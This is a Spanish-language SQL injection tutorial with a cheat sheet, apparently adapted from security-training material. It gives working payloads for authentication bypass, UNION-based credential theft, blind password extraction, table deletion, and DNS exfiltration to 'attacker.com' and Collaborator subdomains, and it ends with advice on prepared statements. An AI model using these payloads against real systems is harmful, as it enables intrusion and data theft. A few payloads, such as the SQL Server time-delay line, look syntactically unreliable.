# SQL Injection

## ¿Qué es la inyección SQL (SQLi)?

La inyección SQL (SQLi) es una vulnerabilidad de seguridad web que permite a un atacante interferir con las consultas que una aplicación realiza a su base de datos. Esto puede permitirle:

* Ver datos que normalmente no debería acceder (credenciales, información personal, etc.).
* Modificar o eliminar datos.
* Escalar el ataque para comprometer el servidor o la infraestructura de backend.
* Realizar ataques de denegación de servicio (DoS).

## Impacto de un ataque exitoso

Un ataque SQLi exitoso puede provocar acceso no autorizado a:

* Contraseñas.
* Detalles de tarjetas de crédito.
* Información personal de los usuarios.

Históricamente, ha sido una de las principales causas de filtraciones de datos de alto perfil.

## Cómo detectar vulnerabilidades SQLi

Puedes detectar SQLi mediante pruebas manuales o con herramientas automatizadas (como Burp Scanner). Algunas pruebas manuales incluyen:

* Insertar un apóstrofe (`'`) y observar si se generan errores.
* Usar operadores booleanos (`OR 1=1` y `OR 1=2`) para analizar la diferencia en las respuestas.
* Inyectar cargas útiles para generar retrasos en la respuesta.
* Utilizar técnicas OAST (Out-of-band Application Security Testing) para detectar interacciones fuera de banda.

### Inyección SQL en diferentes partes de la consulta

Aunque la mayoría de las inyecciones SQL ocurren en la cláusula `WHERE` de una consulta `SELECT`, también pueden presentarse en:

* Sentencias `UPDATE` (en valores actualizados o en la cláusula `WHERE`).
* Sentencias `INSERT` (en valores insertados).
* En la selección de nombres de tablas o columnas.
* En la cláusula `ORDER BY`.

## Ejemplos de ataques SQLi

### Recuperación de datos ocultos

Imagina una aplicación de compras que muestra productos en diferentes categorías. Cuando el usuario hace clic en la categoría "Regalos" (Gifts), su navegador solicita la siguiente URL:

```
https://insecure-website.com/products?category=Gifts
```

Esto provoca que la aplicación ejecute la siguiente consulta SQL para recuperar los detalles de los productos relevantes desde la base de datos:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1;
```

Esta consulta solicita a la base de datos que devuelva:

* Todos los detalles (`*`)
* De la tabla `products`
* Donde la categoría es `'Gifts'`
* Y `released = 1` (se usa para ocultar productos no publicados, suponiendo que los productos no publicados tienen `released = 0`).

La aplicación no implementa ninguna defensa contra ataques de inyección SQL. Esto permite que un atacante manipule la consulta enviando una URL maliciosa como la siguiente:

```
https://insecure-website.com/products?category=Gifts'--
```

Esto generaría la siguiente consulta SQL en el backend:

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1;
```

El `--` es un indicador de comentario en SQL, lo que significa que el resto de la consulta se trata como un comentario y se ignora. En este caso, la condición `AND released = 1` queda eliminada, permitiendo que se muestren todos los productos, incluso los que aún no han sido publicados.

Un atacante también podría modificar la URL para ver todos los productos de la base de datos, incluso aquellos de categorías desconocidas:

```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

Esto generaría la siguiente consulta:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1;
```

La condición `OR 1=1` siempre es verdadera, por lo que la consulta devuelve todos los productos de la base de datos, sin importar su categoría o estado de publicación.

Si bien inyectar `OR 1=1` parece inofensivo cuando se usa en consultas SELECT, muchas aplicaciones reutilizan los datos de una solicitud en múltiples consultas SQL.

Si esta inyección alcanza una consulta `UPDATE` o `DELETE`, podría causar la modificación o eliminación masiva de datos.

### Bypass de autenticación

Si la consulta de autenticación es:

```
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese';
```

Un atacante puede iniciar sesión como administrador con la siguiente entrada:

```
Username: administrator'--
Password: (vacío)
```

La consulta modificada será:

```
SELECT * FROM users WHERE username = 'administrator'--' AND password = '';
```

### UNION attack para obtener datos de otras tablas

Si la consulta es:

```
SELECT name, description FROM products WHERE category = 'Gifts';
```

El atacante puede inyectar:

```
' UNION SELECT username, password FROM users--
```

Modificando la consulta para obtener credenciales de usuario:

```
SELECT name, description FROM products WHERE category = '' UNION SELECT username, password FROM users--';
```

### Inyección SQL ciega (Blind SQL Injection)

Muchas vulnerabilidades de inyección SQL son **ciegas**. Esto significa que la aplicación **no devuelve los resultados de la consulta SQL ni detalles de errores de la base de datos** en sus respuestas.

Aunque estas vulnerabilidades pueden ser más difíciles de explotar, aún es posible acceder a datos no autorizados mediante técnicas avanzadas.

Dependiendo del tipo de vulnerabilidad y de la base de datos, se pueden emplear diversas estrategias:

#### **Manipulación de la lógica de la consulta**

Se puede modificar la consulta para generar **una diferencia detectable** en la respuesta de la aplicación, dependiendo de la veracidad de una condición.

Ejemplo: **inyectar una condición en una lógica booleana**

```sql
' OR 1=1 --
```

O forzar un **error condicional**, como una división por cero:

```sql
' OR 1=1 AND 1/0=1 --
```

Si la aplicación maneja errores de forma diferente a una respuesta normal, se puede inferir información sobre la base de datos.

#### **Retrasos en la ejecución de la consulta (Time-Based SQL Injection)**

Si la aplicación no muestra errores ni diferencias en la respuesta, se puede inyectar un **retraso intencionado** en la consulta y medir el tiempo de respuesta.

Ejemplo para **MySQL** (usando `SLEEP()`):

<pre class="language-sql"><code class="lang-sql"><strong>' OR IF(1=1, SLEEP(5), 0) --
</strong></code></pre>

Ejemplo para **SQL Server** (usando `WAITFOR DELAY`):

```sql
' OR IF(1=1) WAITFOR DELAY '0:0:5' --
```

Si la respuesta tarda más de lo normal, significa que la condición inyectada se evaluó como `TRUE`, permitiendo extraer información bit a bit.

#### **Interacciones fuera de banda (Out-of-Band, OAST)**

Cuando las técnicas anteriores no funcionan, se pueden utilizar canales externos para exfiltrar datos.

Por ejemplo, se puede hacer que la base de datos realice una **búsqueda DNS** con los datos robados hacia un dominio controlado por el atacante:

```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\file')) --
```

Esto permite extraer información sin que la aplicación lo detecte.

### Inyección SQL de segundo orden (Second-order SQL Injection)

Ocurre cuando la aplicación **almacena la entrada del usuario en la base de datos sin vulnerabilidad inmediata**, pero en una solicitud futura la recupera y la usa en una consulta SQL de manera insegura.

Es peligrosa porque los desarrolladores pueden creer que los datos almacenados son **seguros** y no los validan antes de reutilizarlos.

**Un usuario malicioso se registra en la aplicación** con el siguiente nombre:

```
user'; DROP TABLE users; --
```

La aplicación maneja correctamente la inserción en la base de datos y almacena el nombre sin ejecutar la inyección.

**En un momento posterior, la aplicación usa ese nombre en una consulta SQL insegura:**

```sql
SELECT * FROM users WHERE username = 'user'; DROP TABLE users; --';
```

Aquí, cuando la aplicación usa el nombre almacenado sin validarlo, ejecuta el `DROP TABLE`, eliminando toda la tabla `users`.

### Examinando la base de datos

Para **explotar** vulnerabilidades de inyección SQL, es fundamental obtener información sobre la base de datos, incluyendo:

**El tipo y la versión del software de la base de datos.**\
**Las tablas y columnas que contiene la base de datos.**

#### **Consultando el tipo y versión de la base de datos**

Se pueden inyectar consultas específicas para cada proveedor de bases de datos y determinar cuál funciona.

| **Tipo de Base de Datos**   | **Consulta para obtener la versión** |
| --------------------------- | ------------------------------------ |
| Microsoft SQL Server, MySQL | `SELECT @@version`                   |
| Oracle                      | `SELECT * FROM v$version`            |
| PostgreSQL                  | `SELECT version()`                   |

Si la aplicación es vulnerable a SQL Injection, se puede intentar:

```sql
' UNION SELECT @@version--
```

Si la base de datos es **Microsoft SQL Server**, puede devolver un resultado como este:

```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: )
```

Esto confirma que la base de datos es **SQL Server** y revela su versión.

#### **Listando el contenido de la base de datos**

#### Listar las tablas en bases de datos (excepto Oracle)

```sql
SELECT * FROM information_schema.tables;
```

Ejemplo de salida:

| TABLE\_CATALOG | TABLE\_SCHEMA | TABLE\_NAME | TABLE\_TYPE |
| -------------- | ------------- | ----------- | ----------- |
| MyDatabase     | dbo           | Products    | BASE TABLE  |
| MyDatabase     | dbo           | Users       | BASE TABLE  |
| MyDatabase     | dbo           | Feedback    | BASE TABLE  |

Aquí se identifican las tablas **Products, Users y Feedback**.

#### Listar columnas de una tabla específica

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users';
```

Ejemplo de salida:

| TABLE\_CATALOG | TABLE\_SCHEMA | TABLE\_NAME | COLUMN\_NAME | DATA\_TYPE |
| -------------- | ------------- | ----------- | ------------ | ---------- |
| MyDatabase     | dbo           | Users       | UserId       | int        |
| MyDatabase     | dbo           | Users       | Username     | varchar    |
| MyDatabase     | dbo           | Users       | Password     | varchar    |

Esto muestra las columnas de la tabla `Users`, incluyendo `UserId`, `Username` y `Password`.

#### **Listando el contenido de una base de datos Oracle**

Oracle no usa `information_schema`, pero se pueden usar otras vistas del sistema:

Listar todas las tablas:

```sql
SELECT * FROM all_tables;
```

Listar todas las columnas de una tabla específica:

```sql
SELECT * FROM all_tab_columns WHERE table_name = 'USERS';
```

### Inyección SQL en diferentes contextos

Las inyecciones SQL pueden aparecer en entradas JSON o XML. Ejemplo de SQLi en XML:

```
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

## Ataques UNION

Cuando una aplicación es vulnerable a inyección SQL y los resultados de la consulta se devuelven dentro de las respuestas de la aplicación, puedes utilizar la palabra clave `UNION` para recuperar datos de otras tablas dentro de la base de datos. Esto se conoce comúnmente como un ataque de inyección SQL mediante UNION.

La palabra clave `UNION` permite ejecutar una o más consultas `SELECT` adicionales y agregar los resultados a la consulta original. Por ejemplo:

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2;
```

Esta consulta SQL devuelve un único conjunto de resultados con dos columnas, que contienen valores de las columnas `a` y `b` en `table1` y de las columnas `c` y `d` en `table2`.

Para que una consulta `UNION` funcione, se deben cumplir dos requisitos clave:

1. Las consultas individuales deben devolver el mismo número de columnas.
2. Los tipos de datos en cada columna deben ser compatibles entre las consultas individuales.

Para llevar a cabo un ataque de inyección SQL mediante `UNION`, asegúrate de que tu ataque cumpla con estos dos requisitos. Normalmente, esto implica averiguar:

* Cuántas columnas devuelve la consulta original.
* Qué columnas devueltas por la consulta original tienen un tipo de dato adecuado para contener los resultados de la consulta inyectada.

### Determinación del número de columnas necesarias

Cuando realizas un ataque de inyección SQL mediante `UNION`, hay dos métodos efectivos para determinar cuántas columnas devuelve la consulta original.

Un método consiste en inyectar una serie de cláusulas `ORDER BY` e incrementar el índice de columna especificado hasta que ocurra un error. Por ejemplo, si el punto de inyección está dentro de una cadena entre comillas en la cláusula `WHERE` de la consulta original, enviarías:

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

Y así sucesivamente.

Esta serie de cargas útiles modifica la consulta original para ordenar los resultados por diferentes columnas en el conjunto de resultados. La columna en `ORDER BY` se puede especificar por su índice, por lo que no es necesario conocer los nombres de las columnas.

Cuando el índice de columna especificado excede el número real de columnas en el conjunto de resultados, la base de datos devuelve un error, como:

```
The ORDER BY position number 3 is out of range of the number of items in the select list.
```

La aplicación podría devolver el error de la base de datos en su respuesta HTTP, emitir una respuesta de error genérica o simplemente no devolver ningún resultado. De cualquier manera, siempre que puedas detectar una diferencia en la respuesta, puedes inferir cuántas columnas se devuelven en la consulta.

Otro método consiste en enviar una serie de cargas útiles `UNION SELECT`, especificando un número diferente de valores `NULL`:

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

Y así sucesivamente.

Si el número de valores `NULL` no coincide con el número de columnas, la base de datos devuelve un error como:

```
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```

Usamos `NULL` como valores en la consulta inyectada porque los tipos de datos en cada columna deben ser compatibles entre la consulta original y la inyectada. `NULL` es convertible a cualquier tipo de dato común, lo que maximiza la posibilidad de que la carga útil tenga éxito cuando el número de columnas es correcto.

Al igual que con la técnica `ORDER BY`, la aplicación puede devolver el error de la base de datos en su respuesta HTTP, una respuesta genérica o simplemente no mostrar resultados.

Cuando el número de valores `NULL` coincide con el número de columnas, la base de datos devuelve una fila adicional en el conjunto de resultados, con valores `NULL` en cada columna. El efecto en la respuesta HTTP depende del código de la aplicación. Si tienes suerte, verás contenido adicional en la respuesta, como una fila extra en una tabla HTML.

De lo contrario, los valores `NULL` pueden desencadenar un error diferente, como un `NullPointerException`. En el peor de los casos, la respuesta podría parecer la misma que una respuesta con un número incorrecto de `NULL`, lo que haría que este método fuera ineficaz.

### Sintaxis específica de cada base de datos

En **Oracle**, cada consulta `SELECT` debe usar la palabra clave `FROM` y especificar una tabla válida. Existe una tabla incorporada en Oracle llamada `DUAL`, que se puede usar para este propósito. Por lo tanto, las consultas inyectadas en Oracle deben verse así:

```sql
' UNION SELECT NULL FROM DUAL--
```

Las cargas útiles descritas utilizan la secuencia de comentario de doble guion `--` para comentar el resto de la consulta original después del punto de inyección.

En **MySQL**, la secuencia de doble guion `--` debe ir seguida de un espacio. Como alternativa, se puede usar el carácter `#` para indicar un comentario.

Para más detalles sobre la sintaxis específica de cada base de datos, consulta la **SQL Injection Cheat Sheet**.

### Encontrando columnas con un tipo de dato útil

Un ataque de inyección SQL mediante `UNION` te permite recuperar los resultados de una consulta inyectada. Los datos interesantes que deseas obtener suelen estar en **forma de cadena de texto**. Esto significa que necesitas encontrar una o más columnas en los resultados de la consulta original cuyo tipo de dato sea compatible con datos de tipo **string**.

Después de determinar el número de columnas requeridas, puedes probar cada columna para verificar si puede contener datos de tipo string. Para hacerlo, envía una serie de cargas útiles `UNION SELECT` colocando un valor de cadena en cada columna, una por una.

Por ejemplo, si la consulta devuelve **cuatro columnas**, puedes probar con:

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

Si el tipo de dato de una columna **no es compatible** con datos de tipo string, la consulta inyectada provocará un error en la base de datos, como:

```
Conversion failed when converting the varchar value 'a' to data type int.
```

Si **no ocurre un error** y la respuesta de la aplicación contiene algún contenido adicional con el valor de cadena inyectado, entonces la columna correspondiente es adecuada para recuperar datos en formato string.

### Uso de un ataque de inyección SQL mediante UNION para recuperar datos interesantes

Una vez que hayas determinado el número de columnas devueltas por la consulta original y encontrado cuáles columnas pueden contener datos de tipo string, estarás en posición de recuperar datos interesantes.

Supongamos que:

* La consulta original devuelve **dos columnas**, ambas capaces de contener datos de tipo string.
* El punto de inyección está en una cadena entre comillas dentro de la cláusula `WHERE`.
* La base de datos contiene una tabla llamada `users` con las columnas `username` y `password`.

En este caso, puedes recuperar el contenido de la tabla `users` enviando la siguiente entrada:

```sql
' UNION SELECT username, password FROM users--
```

Para llevar a cabo este ataque, necesitas saber que existe una tabla llamada `users` con dos columnas llamadas `username` y `password`. Sin esta información, tendrías que adivinar los nombres de las tablas y columnas.\
Todas las bases de datos modernas proporcionan maneras de examinar la estructura de la base de datos y determinar qué tablas y columnas contienen.

### Recuperando múltiples valores dentro de una sola columna

En algunos casos, la consulta en el ejemplo anterior puede devolver solo una columna.

Puedes recuperar múltiples valores dentro de esta columna única concatenando los valores juntos. Puedes incluir un separador para distinguir los valores combinados. Por ejemplo, en **Oracle** podrías enviar la siguiente entrada:

```sql
' UNION SELECT username || '~' || password FROM users--
```

Esto utiliza la secuencia de doble barra vertical `||`, que es el operador de concatenación de cadenas en Oracle. La consulta inyectada concatena los valores de los campos `username` y `password`, separados por el carácter `~`.

Los resultados de la consulta contienen todos los nombres de usuario y contraseñas, por ejemplo:

```
administrator~s3cure
wiener~peter
carlos~montoya
```

Diferentes bases de datos utilizan diferentes sintaxis para realizar la concatenación de cadenas. Para más detalles, consulta la **SQL Injection Cheat Sheet**.

## Inyección SQL Ciega

La inyección SQL ciega ocurre cuando una aplicación es vulnerable a la inyección SQL, pero sus respuestas HTTP no contienen los resultados de la consulta SQL relevante ni los detalles de los errores de base de datos.

Muchas técnicas, como los ataques UNION, no son efectivas con vulnerabilidades de inyección SQL ciega. Esto se debe a que dependen de poder ver los resultados de la consulta inyectada dentro de las respuestas de la aplicación.

Aún es posible explotar la inyección SQL ciega para acceder a datos no autorizados, pero se deben usar técnicas diferentes.

### Explotación de inyección SQL ciega mediante respuestas condicionales

Considera una aplicación que utiliza cookies de seguimiento para recopilar análisis sobre el uso. Las solicitudes a la aplicación incluyen un encabezado de cookie como este:

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

Cuando se procesa una solicitud que contiene una cookie `TrackingId`, la aplicación utiliza una consulta SQL para determinar si este es un usuario conocido:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

Esta consulta es vulnerable a inyección SQL, pero los resultados de la consulta no se devuelven al usuario. Sin embargo, la aplicación se comporta de manera diferente dependiendo de si la consulta devuelve algún dato. Si envías un `TrackingId` reconocido, la consulta devuelve datos y recibes un mensaje de "Bienvenido de nuevo" en la respuesta.

Este comportamiento es suficiente para poder explotar la vulnerabilidad de inyección SQL ciega. Puedes recuperar información activando respuestas diferentes condicionalmente, dependiendo de una condición inyectada.

Supongamos que se envían dos solicitudes que contienen los siguientes valores de la cookie `TrackingId`:

1. `…xyz' AND '1'='1`
2. `…xyz' AND '1'='2`

* El primer valor de estas solicitudes hace que la consulta devuelva resultados, porque la condición inyectada `AND '1'='1` es verdadera. Como resultado, se muestra el mensaje "Bienvenido de nuevo".
* El segundo valor hace que la consulta no devuelva resultados, porque la condición inyectada es falsa. El mensaje "Bienvenido de nuevo" no se muestra.

Esto nos permite determinar la respuesta a cualquier condición inyectada y extraer datos uno a uno.

Supón que existe una tabla llamada `Users` con las columnas `Username` y `Password`, y un usuario llamado `Administrator`. Puedes determinar la contraseña de este usuario enviando una serie de entradas para probar la contraseña, un carácter a la vez.

Para hacerlo, comienza con la siguiente entrada:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

Esto devuelve el mensaje "Bienvenido de nuevo", lo que indica que la condición inyectada es verdadera, y por lo tanto, el primer carácter de la contraseña es mayor que `m`.

Luego, envías la siguiente entrada:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

Esto no devuelve el mensaje "Bienvenido de nuevo", lo que indica que la condición inyectada es falsa, y por lo tanto, el primer carácter de la contraseña no es mayor que `t`.

Eventualmente, envías la siguiente entrada, que devuelve el mensaje "Bienvenido de nuevo", confirmando que el primer carácter de la contraseña es `s`:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

Puedes continuar este proceso para determinar sistemáticamente la contraseña completa del usuario `Administrator`.

> **Nota**: La función `SUBSTRING` se llama `SUBSTR` en algunos tipos de bases de datos. Para más detalles, consulta la **SQL Injection Cheat Sheet**.

## Cómo Prevenir la Inyección SQL

Puedes prevenir la mayoría de las instancias de inyección SQL usando consultas parametrizadas en lugar de concatenar cadenas dentro de la consulta. Estas consultas parametrizadas también se conocen como **sentencias preparadas**.

### Código Vulnerable

El siguiente código es vulnerable a la inyección SQL porque la entrada del usuario se concatena directamente en la consulta:

```java
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

### Prevención de Inyección SQL con Sentencias Preparadas

Puedes reescribir este código de manera que evite que la entrada del usuario interfiera con la estructura de la consulta:

```java
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

### Usos de Consultas Parametrizadas

Puedes usar consultas parametrizadas para cualquier situación donde la entrada no confiable aparezca como datos dentro de la consulta, incluyendo la cláusula **WHERE** y los valores en una sentencia **INSERT** o **UPDATE**. Sin embargo, no pueden usarse para manejar entradas no confiables en otras partes de la consulta, como los nombres de tablas o columnas, o la cláusula **ORDER BY**. La funcionalidad de la aplicación que coloca datos no confiables en estas partes de la consulta debe tomar un enfoque diferente, como:

* **Lista blanca** de valores de entrada permitidos.
* Usar lógica diferente para entregar el comportamiento requerido.

### Requisitos para una Consulta Parametrizada Eficaz

Para que una consulta parametrizada sea eficaz en la prevención de la inyección SQL, la cadena utilizada en la consulta debe ser siempre una constante codificada de manera fija. Nunca debe contener datos variables de ninguna fuente. No te dejes tentar a decidir caso por caso si un dato es confiable y continuar usando concatenación de cadenas dentro de la consulta en casos que se consideren "seguros". Es fácil cometer errores sobre el origen posible de los datos o que cambios en otro código puedan "corromper" los datos confiables.

## SQL Injection Cheat Sheet

Esta "cheat sheet" de SQL injection contiene ejemplos de sintaxis útil que puedes usar para realizar una variedad de tareas que suelen surgir al ejecutar ataques de SQL injection.

### Concatenación de cadenas

Puedes concatenar múltiples cadenas para formar una sola cadena.

| Base de datos | Sintaxis                         |
| ------------- | -------------------------------- |
| Oracle        | `'foo'\|\|'bar'`                 |
| Microsoft     | `'foo'+'bar'`                    |
| PostgreSQL    | `'foo'\|\|'bar'`                 |
| MySQL         | `'foo' 'bar'` \[Nota el espacio] |
|               | `CONCAT('foo','bar')`            |

### Subcadena

Puedes extraer una parte de una cadena, a partir de un desplazamiento especificado con una longitud determinada. Ten en cuenta que el índice de desplazamiento comienza desde 1. Cada una de las siguientes expresiones devolverá la cadena `ba`.

| Base de datos | Sintaxis                    |
| ------------- | --------------------------- |
| Oracle        | `SUBSTR('foobar', 4, 2)`    |
| Microsoft     | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL    | `SUBSTRING('foobar', 4, 2)` |
| MySQL         | `SUBSTRING('foobar', 4, 2)` |

### Comentarios

Puedes usar comentarios para truncar una consulta y eliminar la parte de la consulta original que sigue a tu entrada.

| Base de datos | Sintaxis                           |
| ------------- | ---------------------------------- |
| Oracle        | `--comentario`                     |
| Microsoft     | `--comentario`                     |
|               | `/*comentario*/`                   |
| PostgreSQL    | `--comentario`                     |
|               | `/*comentario*/`                   |
| MySQL         | `#comentario`                      |
|               | `-- comentario` \[Nota el espacio] |
|               | `/*comentario*/`                   |

### Versión de la base de datos

Puedes consultar la base de datos para determinar su tipo y versión. Esta información es útil cuando formulas ataques más complicados.

| Base de datos | Sintaxis                         |
| ------------- | -------------------------------- |
| Oracle        | `SELECT banner FROM v$version`   |
|               | `SELECT version FROM v$instance` |
| Microsoft     | `SELECT @@version`               |
| PostgreSQL    | `SELECT version()`               |
| MySQL         | `SELECT @@version`               |

### Contenido de la base de datos

Puedes listar las tablas que existen en la base de datos, y las columnas que contienen esas tablas.

| Base de datos | Sintaxis                                                                        |
| ------------- | ------------------------------------------------------------------------------- |
| Oracle        | `SELECT * FROM all_tables`                                                      |
|               | `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`            |
| Microsoft     | `SELECT * FROM information_schema.tables`                                       |
|               | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| PostgreSQL    | `SELECT * FROM information_schema.tables`                                       |
|               | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| MySQL         | `SELECT * FROM information_schema.tables`                                       |
|               | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |

### Errores condicionales

Puedes probar una condición booleana y activar un error en la base de datos si la condición es verdadera.

| Base de datos | Sintaxis                                                                                |
| ------------- | --------------------------------------------------------------------------------------- |
| Oracle        | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`      |
| Microsoft     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`                         |
| PostgreSQL    | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`          |
| MySQL         | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

### Extracción de datos a través de mensajes de error visibles

Puedes potencialmente provocar mensajes de error que filtren datos sensibles devueltos por tu consulta maliciosa.

| Base de datos | Sintaxis                                                                      |
| ------------- | ----------------------------------------------------------------------------- |
| Microsoft     | `SELECT 'foo' WHERE 1 = (SELECT 'secret')`                                    |
| PostgreSQL    | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)`                    |
| MySQL         | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))` |

### Consultas encadenadas (Batched queries)

Puedes usar consultas encadenadas para ejecutar múltiples consultas en sucesión. Ten en cuenta que mientras las consultas posteriores se ejecutan, los resultados no se devuelven a la aplicación. Esta técnica se usa principalmente en relación con vulnerabilidades ciegas, donde puedes usar una segunda consulta para activar una búsqueda DNS, un error condicional o un retraso en el tiempo.

| Base de datos | Sintaxis                         |
| ------------- | -------------------------------- |
| Oracle        | No admite consultas encadenadas. |
| Microsoft     | `QUERY-1-HERE; QUERY-2-HERE`     |
|               | `QUERY-1-HERE QUERY-2-HERE`      |
| PostgreSQL    | `QUERY-1-HERE; QUERY-2-HERE`     |
| MySQL         | `QUERY-1-HERE; QUERY-2-HERE`     |

> Nota: En MySQL, normalmente no se pueden usar consultas encadenadas para SQL injection. Sin embargo, esto es posible en ocasiones si la aplicación de destino utiliza ciertas APIs de PHP o Python para comunicarse con una base de datos MySQL.

### Retrasos en el tiempo (Time delays)

Puedes causar un retraso de tiempo en la base de datos cuando se procesa la consulta. Lo siguiente causará un retraso incondicional de 10 segundos.

| Base de datos | Sintaxis                              |
| ------------- | ------------------------------------- |
| Oracle        | `dbms_pipe.receive_message(('a'),10)` |
| Microsoft     | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL    | `SELECT pg_sleep(10)`                 |
| MySQL         | `SELECT SLEEP(10)`                    |

### Retrasos condicionales en el tiempo

Puedes probar una condición booleana y activar un retraso en el tiempo si la condición es verdadera.

| Base de datos | Sintaxis                                                                                                         |
| ------------- | ---------------------------------------------------------------------------------------------------------------- |
| Oracle        | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| Microsoft     | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`                                                                |
| PostgreSQL    | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`                                  |
| MySQL         | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`                                                                   |

### Búsqueda DNS

Puedes hacer que la base de datos realice una búsqueda DNS a un dominio externo. Para hacer esto, necesitarás usar Burp Collaborator para generar un subdominio único de Burp Collaborator que usarás en tu ataque y luego consultar el servidor de Collaborator para confirmar que ocurrió una búsqueda DNS.

| Base de datos | Sintaxis                                                                                                                                                                                                |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Oracle        | (Vulnerabilidad XXE) `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual` |
|               | `SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')`                                                                                                                                     |
| Microsoft     | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`                                                                                                                                             |
| PostgreSQL    | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`                                                                                                                                    |
| MySQL         | (Solo en Windows) `LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`                                                                                                                                     |
|               | `SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'`                                                                                                                                          |

### Búsqueda DNS con exfiltración de datos

Puedes hacer que la base de datos realice una búsqueda DNS a un dominio externo que contenga los resultados de una consulta inyectada. Para hacer esto, necesitarás usar Burp Collaborator para generar un subdominio único de Burp Collaborator que usarás en tu ataque y luego consultar el servidor de Collaborator para obtener los detalles de cualquier interacción DNS, incluidos los datos exfiltrados.

| Base de datos | Sintaxis                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Oracle        | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'\|\|(SELECT YOUR-QUERY-HERE)\|\|'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`                                                                                                                                                                                                                                        |
| Microsoft     | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')`                                                                                                                                                                                                                                                                                                                               |
| PostgreSQL    | <p><code>create OR replace function f() returns void as $$</code><br><code>declare c text;</code><br><code>declare p text;</code><br><code>begin</code><br><code>SELECT into p (SELECT YOUR-QUERY-HERE);</code><br><code>c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';</code><br><code>execute c;</code><br><code>END;</code><br><code>$$ language plpgsql security definer;</code><br><code>SELECT f();</code></p> |
| MySQL         | (Solo en Windows) `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'`                                                                                                                                                                                                                                                                                                                                                                 |
